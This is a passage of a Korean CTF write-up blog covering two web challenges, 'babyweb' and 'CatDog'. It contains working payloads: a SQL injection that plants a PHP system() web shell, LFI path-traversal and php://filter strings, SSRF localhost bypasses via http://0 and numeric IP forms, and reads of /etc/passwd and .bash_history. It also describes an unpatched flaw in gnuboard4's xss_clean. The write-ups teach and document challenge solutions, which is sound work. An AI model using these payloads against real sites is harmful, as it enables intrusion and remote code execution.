    </span><span class="nv">$data</span><span class="s2"> = preg_replace('#(&lt;[^&gt;]+?)style[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*=[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*[`</span><span class="se">\\</span><span class="s2">'"</span><span class="p">]</span><span class="o">*.*?</span><span class="nb">expression</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="err">\\</span><span class="p">([</span><span class="o">^&gt;</span><span class="p">]</span><span class="o">*+&gt;</span><span class="c1">#i', '$1&gt;', $data); </span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#(&lt;[^&gt;]+?)style[\\x00-\\x20]*=[\\x00-\\x20]*[`\\'</span><span class="s2">"]*.*?behaviour[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*</span><span class="se">\\</span><span class="s2">([^&gt;]*+&gt;#i', '$1&gt;', </span><span class="nv">$data</span><span class="s2">); 
    </span><span class="nv">$data</span><span class="s2"> = preg_replace('#(&lt;[^&gt;]+?)style[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*=[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*[`</span><span class="se">\\</span><span class="s2">'"</span><span class="p">]</span><span class="o">*.*?</span><span class="nx">s</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">c</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">r</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">i</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">p</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">t</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*:*</span><span class="p">[</span><span class="o">^&gt;</span><span class="p">]</span><span class="o">*+&gt;</span><span class="c1">#i', '$1&gt;', $data); </span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#&lt;/*\\w+:\\w[^&gt;]*+&gt;#i'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span> 

    <span class="k">do</span> 
    <span class="p">{</span> 
        <span class="nv">$old_data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span> 
        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#&lt;/*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^&gt;]*+&gt;#i'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span> 
    <span class="p">}</span> 
    <span class="k">while</span> <span class="p">(</span><span class="nv">$old_data</span> <span class="o">!==</span> <span class="nv">$data</span><span class="p">);</span> 
     
    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span> 
<span class="p">}</span>

<span class="o">.......</span>

<span class="nv">$xmldata</span> <span class="o">=</span> <span class="nx">xss_filter</span><span class="p">(</span><span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$data</span><span class="p">));</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s1">'update users set xmldata="'</span><span class="o">.</span><span class="nv">$xmldata</span><span class="o">.</span><span class="s1">'" where userid="'</span><span class="o">.</span><span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">])</span><span class="o">.</span><span class="s1">'";'</span><span class="p">;</span>
<span class="nv">$res</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>

</code></pre></div></div>

<p>RCE를 위해 해당 문제에서 사용해야할 것은 “/var/lib/php/sessions/” 경로에 있는 PHP 세션 파일을 사용하는 것 밖에는 없으므로 봐야할 것은 nickname과 userid에 PHP 코드를 넣을 수 있게 SQLI 인젝션을 생각할 수 밖에 없다.</p>

<p>mysqli_real_escape_string 함수를 사용하면 SQLI 취약점을 막을 수 있지만 해당 함수를 사용한뒤에 xss_filter 함수를 사용했기 때문에 SQLI 취약점이 일어날 곳은 여기밖에 없다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$xmldata</span> <span class="o">=</span> <span class="nx">xss_filter</span><span class="p">(</span><span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$data</span><span class="p">));</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s1">'update users set xmldata="'</span><span class="o">.</span><span class="nv">$xmldata</span><span class="o">.</span><span class="s1">'" where userid="'</span><span class="o">.</span><span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">])</span><span class="o">.</span><span class="s1">'";'</span><span class="p">;</span>
<span class="nv">$res</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>

</code></pre></div></div>

<p>그 후 xss_filter를 자세히 살펴보면 아래와 같은 함수를 찾을 수 있다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">"html_entity_decode"</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">html_entity_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> 
    <span class="p">}</span>

</code></pre></div></div>

<p>xss를 방어하기 위해서 html_entity_decode함수를 사용하는데 여기에서 문제가 발생한다.</p>

<p>만약 aaaa”bbbb 를 사용한다면 어떻게 될까?</p>

<p>위 데이터가 html_entity_decode를 거치면 아래와 같이 변환된다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">aaaa</span><span class="s2">"bbbb

</span></code></pre></div></div>

<p>따라서 우리는 quot문자를 사용할 수 있고 update 문에서 SQLI가 발생하게 할 수 있다.</p>

<h3 id="공격-코드">공격 코드</h3>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaaa<span class="ni">&amp;quot;</span>, nickname=<span class="ni">&amp;quot;</span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">x</span><span class="p">]);</span>

</code></pre></div></div>

<h3 id="변환된-공격-코드">변환된 공격 코드</h3>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaaa", nickname="<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">x</span><span class="p">]);</span>

</code></pre></div></div>

<p>사실 이렇게만 보면 아주 간단하고 쉬운 문제이지만, 이 문제를 내게된 배경이 있다.</p>

<p>xss_filter 함수는 그누보드4에서 사용되는 “xss_clean” 함수 이고 제로데이 취약점이였다. 지금은 그누보드5가 배포되고 있어서 문제는 없지만 아직도 그누보드4 배포본 에서는 제로데이 취약점으로 남아 있다.</p>

<p>그누보드4에서는 “common.php”에서 mysqli_real_escape_string 대용으로 addslashes 함수를 이용해 서버로 오는 변수에 대해 전체적으로 SQLI를 방어하고 “extract($_GET);”, “extract($_POST);”를 사용하여 서버에 오는 변수를 그대로 PHP 변수로 사용할 수 있다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">get_magic_quotes_gpc</span><span class="p">()</span> <span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">)</span> <span class="p">)</span>
	<span class="p">{</span>
		<span class="k">while</span><span class="p">(</span> <span class="k">list</span><span class="p">(</span><span class="nv">$k</span><span class="p">,</span> <span class="nv">$v</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">)</span> <span class="p">)</span>
		<span class="p">{</span>
			<span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$k</span><span class="p">])</span> <span class="p">)</span>
			<span class="p">{</span>
				<span class="k">while</span><span class="p">(</span> <span class="k">list</span><span class="p">(</span><span class="nv">$k2</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$k</span><span class="p">])</span> <span class="p">)</span>
				<span class="p">{</span>
					<span class="nv">$_GET</span><span class="p">[</span><span class="nv">$k</span><span class="p">][</span><span class="nv">$k2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v2</span><span class="p">);</span>
				<span class="p">}</span>
				<span class="o">@</span><span class="nb">reset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$k</span><span class="p">]);</span>
			<span class="p">}</span>
			<span class="k">else</span>
			<span class="p">{</span>
				<span class="nv">$_GET</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="o">@</span><span class="nb">reset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
	<span class="p">}</span>

<span class="nx">same</span> <span class="nv">$_POST</span> <span class="o">...</span>

<span class="nx">same</span> <span class="nv">$_COOKIE</span> <span class="o">...</span>
<span class="p">}</span>

</code></pre></div></div>

<p>그래서 아래와 같이 사용하면 취약점을 발견하기 힘들다. 언뜻 보면 게시판에서 xss를 방어하는 것 같지만 xss_clean 함수 때문에 SQLI 취약점이 일어난다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$query</span> <span class="o">=</span> <span class="s2">"update board set title='</span><span class="nv">$title</span><span class="s2">', body='"</span><span class="o">.</span><span class="nx">xss_clean</span><span class="p">(</span><span class="nv">$body</span><span class="p">)</span><span class="o">.</span><span class="s2">"', '</span><span class="nv">$userid</span><span class="s2">' ...... "</span><span class="p">;</span>

</code></pre></div></div>

<p>babyweb 문제를 내면서 취약점을 쉽게 알아볼 수 있도록 login.php, join.php 등에서는 작은 따옴표를 사용했고, getxmldata.php에서는 큰 따옴표를 사용했으며, SQLI 취약점을 직관적으로 알아볼 수 있도록 mysqli_real_escape_string을 전역적으로 사용하지 않고 xss_filter함수와 같이 보이게 사용하였다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$query</span> <span class="o">=</span> <span class="nx">xss_filter</span><span class="p">(</span><span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nx">데이터</span><span class="p">));</span>
</code></pre></div></div>

<p><br></p>

<p><br></p>

<h2 id="catdog">
<a class="anchor" href="#catdog" aria-hidden="true"><span class="octicon octicon-link"></span></a>CatDog</h2>

<hr>

<p><img src="/assets/bob/bob923.png" alt="/assets/bob/bob923.png"></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lfi + sqli + ssrf
description의 cat은 php, dog은 python flask를 의미한다.

8888포트로 돌고 있는 php는 flag 파일의 read 권한이 없기 때문에 내부에서 돌고 있는 flask를 이용하여 flag 파일을 읽어오는 것이 목표임.
이 flask 서버는 localhost만 접근 가능하다.

웹서버에서 일반적으로 가지는 'www-data' 권한이 아닌 'php' 유저로 돌아간다는 설명이 flask 포트를 얻을 수 있는 힌트임.

lfi를 통해 flask 포트를 알아낸 후 ssrf를 이용하여 flask 서비스에 접근하면 /flag path에서 passcode를 요구한다. 이 passcode는 sqli를 이용하여 얻어낼 수 있다.

/flag?passcode=@@@@와 같이 passcode를 입력하면 플래그를 얻을 수 있다.
</code></pre></div></div>

<h3 id="1-indexphp-소스코드-추출--lfi-취약점">1. index.php 소스코드 추출 + lfi 취약점</h3>

<p><img src="/assets/bob/bob924.png" alt="/assets/bob/bob924.png"></p>

<p><img src="/assets/bob/bob925.png" alt="/assets/bob/bob925.png"></p>

<ul>
  <li>메인페이지에서 view-source를 하면 68번째 라인에 주석으로 <code class="highlighter-rouge">index.php/?source</code> 가 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
    <span class="k">include_once</span> <span class="s2">"header.php"</span><span class="p">;</span>
    <span class="k">include_once</span> <span class="s2">"config.php"</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'source'</span><span class="p">])){</span>
        <span class="k">echo</span> <span class="s2">"&lt;div style='margin-top: 6rem;'/&gt;"</span><span class="p">;</span>
        <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
        <span class="k">die</span><span class="p">();</span>
    <span class="p">}</span>
    
    <span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"page"</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="k">and</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$page</span><span class="p">)){</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/.php/"</span><span class="p">,</span> <span class="nv">$page</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">){</span>
            <span class="nv">$page</span> <span class="o">.=</span> <span class="s2">".php"</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/(login|register)/"</span><span class="p">,</span> <span class="nv">$page</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">==</span> <span class="kc">null</span><span class="p">){</span>
            <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('Please Login!');location.href='/?page=login';&lt;/script&gt;"</span><span class="p">;</span>
            <span class="k">die</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="k">include</span> <span class="nv">$page</span><span class="p">;</span>
        <span class="k">die</span><span class="p">();</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
<span class="c">&lt;!-- index.php/?source --&gt;</span>
<span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div&gt;</span>
        <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/images/bg.jpg"</span> <span class="na">style=</span><span class="s">"width: 100%; height: 80vh; object-fit: cover; opacity: 0.5"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"display: flex; justify-content: center;"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"font-size: 4rem;"</span><span class="nt">&gt;</span>
            meow
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div>

<ul>
  <li>
<code class="highlighter-rouge">index.php/?source</code> 에 접근하면 <code class="highlighter-rouge">index.php</code> 의 소스코드를 얻을 수 있다.</li>
  <li>
<code class="highlighter-rouge">$page</code> 파라미터를 include하는 것으로 보아 lfi 취약점이 발생할 수 있는 가능성을 볼 수 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/.php/"</span><span class="p">,</span> <span class="nv">$page</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">){</span>
            <span class="nv">$page</span> <span class="o">.=</span> <span class="s2">".php"</span><span class="p">;</span>
        <span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>
<code class="highlighter-rouge">$page</code> 파라미터에 <code class="highlighter-rouge">.php</code> 가 존재하지 않을 경우 마지막에 <code class="highlighter-rouge">.php</code> 를 추가하는 코드가 있지만, 해당 정규표현식은 <code class="highlighter-rouge">.php</code> 가 존재하기만 한다면 우회가 가능하다.</li>
  <li>따라서 <code class="highlighter-rouge">/?page=/.php/../../../../../../etc/issue</code> 와 같은 페이로드를 통해 file leak이 가능하다.</li>
  <li>또한, <code class="highlighter-rouge">/?page=php://filter/convert.base64-encode/resource=articles</code> 와 같이  php wrapper를 이용하여 서비스에 존재하는 php 소스코드를 모두 leak하는 것이 가능하다.</li>
</ul>

<h3 id="2-ssrf-취약점">2. ssrf 취약점</h3>

<p><img src="/assets/bob/bob926.png" alt="/assets/bob/bob926.png"></p>

<ul>
  <li>다음으로 articles를 보면 글 작성 시 이미지가 자동으로 첨부되는 것을 확인할 수 있는데, 이 이미지를 mypage에서 변경할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob927.png" alt="/assets/bob/bob927.png"></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- ... --&gt;</span>

<span class="cp">&lt;?php</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"type"</span><span class="p">])){</span>
        <span class="nb">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
        <span class="nv">$url</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"url"</span><span class="p">]);</span>

        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/^(http\:\/\/|https\:\/\/)/"</span><span class="p">,</span> <span class="nv">$url</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span> <span class="o">||</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/(127\.0\.0\.1|localhost)/"</span><span class="p">,</span> <span class="nv">$url</span><span class="p">)</span> <span class="o">===</span> <span class="mi">1</span><span class="p">){</span>
            <span class="k">echo</span><span class="p">(</span><span class="s2">"&lt;script&gt;alert('Don\'t hack!');location.href='/?page=mypage';&lt;/script&gt;"</span><span class="p">);</span>
            <span class="k">die</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$url</span> <span class="o">==</span> <span class="s2">""</span><span class="p">){</span>
            <span class="k">echo</span><span class="p">(</span><span class="s2">"&lt;script&gt;alert('Enter the image URL!');location.href='/?page=mypage';&lt;/script&gt;"</span><span class="p">);</span>
            <span class="k">die</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"p"</span><span class="p">){</span>
            <span class="nv">$data</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">));</span>
            <span class="nv">$src</span> <span class="o">=</span> <span class="s2">"data: png;base64,${data}"</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">"&lt;img src='${src}' style='height: 40vh; width: 100%; object-fit: cover;'/&gt;"</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"o"</span><span class="p">){</span>
            <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$sql</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"update user set img = ? where username = ?"</span><span class="p">);</span>
            <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s1">'ss'</span><span class="p">,</span> <span class="nv">$url</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]);</span>
            <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
        
            <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">get_result</span><span class="p">();</span>
            <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('Complete.');location.href='/?page=articles'&lt;/script&gt;"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="c">&lt;!-- ... --&gt;</span>
</code></pre></div></div>

<ul>
  <li>mypage의 코드를 확인해보면 preview를 눌렀을 때 <code class="highlighter-rouge">file_get_contents</code> 를 이용하여 <code class="highlighter-rouge">url</code> 의 값을 가져온 후 base64로 인코딩하여 이미지를 보여준다.</li>
  <li>이 때 <code class="highlighter-rouge">file_get_contents</code> 를 이용한 file leak을 방지하기 위해 <code class="highlighter-rouge">http/https scheme</code> 를 강제하였으며, <code class="highlighter-rouge">localhost</code> 와 <code class="highlighter-rouge">127.0.0.1</code> 의 값을 막아두었다.</li>
  <li>여기서 도메인을 <code class="highlighter-rouge">localhost</code> 와 <code class="highlighter-rouge">127.0.0.1</code> 대신 <code class="highlighter-rouge">http://0</code> 이나 10진수 표현 <code class="highlighter-rouge">http://213070643</code> 또는 16진수 표현 <code class="highlighter-rouge">http://0x7F000001</code> 등을 사용하여 우회하면 ssrf 취약점이 발생한다.</li>
</ul>

<h3 id="3-힌트">3. 힌트</h3>

<p><img src="/assets/bob/bob928.png" alt="/assets/bob/bob928.png"></p>

<ul>
  <li>다시 문제 description을 살펴보면 주머니에 <code class="highlighter-rouge">개</code> 를 숨겨두었으며, 플래그를 가지고 있다고 한다. 현재로선 개가 어떤 <code class="highlighter-rouge">개</code> 가 어떤 것을 의미하는지 알 수 없다.</li>
  <li>다음으로, 하단의 박스를 확인해보면 웹서버가 <code class="highlighter-rouge">www-data</code> 가 아닌 <code class="highlighter-rouge">php</code> 유저로 돌고 있다는 것을 확인할 수 있다.</li>
  <li>웹서버의 유저를 변경하여 사용하는 경우는 특수한 경우이기 때문에, 의심해볼 여지가 있다.</li>
</ul>

<p><img src="/assets/bob/bob929.png" alt="/assets/bob/bob929.png"></p>

<ul>
  <li>php 계정에 대한 힌트를 얻었으니, lfi 취약점을 이용해 <code class="highlighter-rouge">/etc/passwd</code> 파일을 확인해보자.</li>
  <li>해당 파일에는 php 계정과 python 계정이 존재하며, <code class="highlighter-rouge">/home/php</code> 와 <code class="highlighter-rouge">/home/python</code> 가 홈 디렉토리로 지정되어 있다. 또한, 계정 접근 시 <code class="highlighter-rouge">/bin/bash</code> 를 사용하는 것으로 보아 쉘을 사용한다는 것을 유추할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob930.png" alt="/assets/bob/bob930.png"></p>

<ul>
  <li>
<code class="highlighter-rouge">php</code> 계정 홈 디렉토리에 존재하는 <code class="highlighter-rouge">.bash_history</code> 를 확인해보면 <code class="highlighter-rouge">localhost</code> 의 2026 포트로 <code class="highlighter-rouge">curl</code> 요청을 날리는 것을 확인할 수 있다. 이를 통해 문제 description의 <code class="highlighter-rouge">개</code> 가 웹 서비스라는 것을 알 수 있다.</li>
  <li>해당 포트에서 돌고 있는 웹 서비스는 <code class="highlighter-rouge">localhost</code> 에서만 접근이 가능하도록 설정하였기 때문에, 이전에 발견했던 <code class="highlighter-rouge">ssrf</code> 취약점을 통해 요청을 해야만 한다.</li>
</ul>

<h3 id="4-숨겨진-웹-서비스dog-요청">4. 숨겨진 웹 서비스(dog) 요청</h3>

<p><img src="/assets/bob/bob931.png" alt="/assets/bob/bob931.png"></p>

<ul>
  <li>
<code class="highlighter-rouge">mypage</code> 에서 <code class="highlighter-rouge">http://0:2026</code> 으로 <code class="highlighter-rouge">preview</code> 를 요청하면 정상적으로 요청되는 것을 확인할 수 있다.</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://0:2026

Well done! Go to /flag
</code></pre></div></div>

<ul>
  <li>하단의 이미지를 <code class="highlighter-rouge">새 탭에서 열기</code> 등을 이용하여 데이터를 확인해보면 <code class="highlighter-rouge">localhost</code> 의 2026 포트로 돌고 있는 <code class="highlighter-rouge">웹 서비스</code> 를 확인할 수 있으며, <code class="highlighter-rouge">/flag</code> path로 이동하라는 메시지가 나타난다.</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://0:2026/flag

Usage : /flag?passcode=
/flag has a delay for 3sec.
Do not bruteforce!
</code></pre></div></div>

<ul>
  <li>
<code class="highlighter-rouge">/flag</code> path에 접근하면 <code class="highlighter-rouge">passcode</code> 를 요구한다. <code class="highlighter-rouge">mypage</code> 페이지와 동일하게 3초의 딜레이를 가지고 있는 것을 확인할 수 있다.</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://0:2026/flag?passcode=1234

Wrong passcode!
Go back to PHP... You can get the passcode in PHP
</code></pre></div></div>

<ul>
  <li>아무 <code class="highlighter-rouge">passcode</code> 를 입력하면 위와 같은 안내 메시지가 나타난다. 현재 서비스에서 <code class="highlighter-rouge">passcode</code> 를 얻을 수 있는 방법이 없기 때문에 <code class="highlighter-rouge">php</code> 서비스로 돌아가자.</li>
</ul>

<h3 id="5-sql-injection--passcode-확인">5. sql injection → passcode 확인</h3>

<p><img src="/assets/bob/bob932.png" alt="/assets/bob/bob932.png"></p>

<ul>
  <li>
<code class="highlighter-rouge">articles.php</code> 페이지의 상단을 보면 검색 박스가 있는 것을 확인할 수 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- ... --&gt;</span>

<span class="cp">&lt;?php</span>
		  <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"search"</span><span class="p">];</span>
		  <span class="nv">$search</span> <span class="o">=</span> <span class="s2">"%${s}%"</span><span class="p">;</span>
		  
		  <span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"p"</span><span class="p">];</span>
		  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$page</span> <span class="o">==</span> <span class="s2">""</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$page</span><span class="p">)){</span>
		      <span class="nv">$page</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
		  <span class="p">}</span>
		  <span class="k">else</span><span class="p">{</span>
		      <span class="nv">$page</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
		  <span class="p">}</span>
		  <span class="nv">$page</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
		  <span class="k">if</span><span class="p">(</span><span class="nv">$page</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="nv">$page</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		  <span class="nv">$start</span> <span class="o">=</span> <span class="nv">$page</span><span class="o">*</span><span class="mi">10</span><span class="p">;</span>
		  
		  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/(\ |</span><span class="se">\n</span><span class="s2">|</span><span class="se">\t</span><span class="s2">|</span><span class="se">\r</span><span class="s2">|@|insert|update|delete|=|like|admin|substr|concat|-|ascii|`|load|into|clue|text</span><span class="se">\"</span><span class="s2">)/i"</span><span class="p">,</span> <span class="nv">$search</span><span class="p">)</span> <span class="o">===</span> <span class="mi">1</span><span class="p">){</span>
		      <span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('Don\'t hack!');history.back();&lt;/script&gt;"</span><span class="p">;</span>
		      <span class="k">die</span><span class="p">();</span>
		  <span class="p">}</span>
		  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id, title, content, author, img from board where title like '${search}' or content like '${search}' order by id desc limit ${start}, 10"</span><span class="p">;</span>
